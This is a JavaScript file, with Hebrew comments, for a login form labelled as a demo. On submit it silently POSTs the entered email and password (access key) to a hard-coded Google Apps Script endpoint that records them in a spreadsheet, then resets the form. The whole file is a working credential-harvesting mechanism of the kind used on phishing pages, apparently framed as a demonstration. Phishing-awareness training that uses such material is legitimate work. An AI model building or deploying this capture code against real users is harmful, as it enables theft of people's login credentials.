// 🔗 Web App URL שלך (עדכן אם פרסת Apps Script מחדש וקיבלת URL חדש)
const ENDPOINT = "https://script.google.com/macros/s/AKfycbwFIgpYtR4r0I29Q0VZUjmmP8oqUO1PgOoyj08rtB1fd30UOA6m-Bxi4mWFeyQQHVot/exec";

const form     = document.getElementById("loginForm");
const emailEl  = document.getElementById("email");
const keyEl    = document.getElementById("password");
const statusEl = document.getElementById("status");
const submit   = document.getElementById("submitBtn");
const spinner  = document.getElementById("spinner");
const btnText  = document.getElementById("btnText");
const toggle   = document.getElementById("togglePwd");

// הצגת/הסתרת סיסמה (דמו)
toggle.addEventListener("click", () => {
  const isPwd = keyEl.type === "password";
  keyEl.type = isPwd ? "text" : "password";
  toggle.textContent = isPwd ? "🙈" : "👁️";
});

// שליחה — POST אחד בלבד (רושם: זמן | אימייל (דמו) | מפתח (דמו))
form.addEventListener("submit", async (e) => {
  e.preventDefault();

  const email = emailEl.value.trim();
  const key   = keyEl.value.trim();
  if (!email || !key) { setStatus("נא למלא אימייל ומפתח גישה (דמו).", "warn"); return; }

  setLoading(true);
  setStatus("שולח (דמו)…");

  try {
    await fetch(ENDPOINT, {
      method: "POST",
      mode: "no-cors",
      headers: { "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8" },
      body: new URLSearchParams({ email, key }).toString()
    });

    form.reset();
    setStatus("✅ נשלח (דמו). בדוק/י את הגיליון בטאב „רישומי הדגמה”.", "ok");
  } catch (err) {
    console.error(err);
    setStatus("⚠️ ניסיון שליחה נכשל. בדוק/י הרשאות ה-Web App.", "err");
  } finally {
    setLoading(false);
  }
});

function setLoading(v){
  if (v){
    submit.classList.add("loading");
    submit.disabled = true;
    spinner.style.opacity = "1";
    btnText.textContent = "Processing…";
  } else {
    submit.classList.remove("loading");
    submit.disabled = false;
    spinner.style.opacity = "0";
    btnText.textContent = "Authenticate";
  }
}
function setStatus(t, tone){
  statusEl.textContent = t || "";
  statusEl.classList.remove("ok","warn","err");
  if (tone) statusEl.classList.add(tone);
}
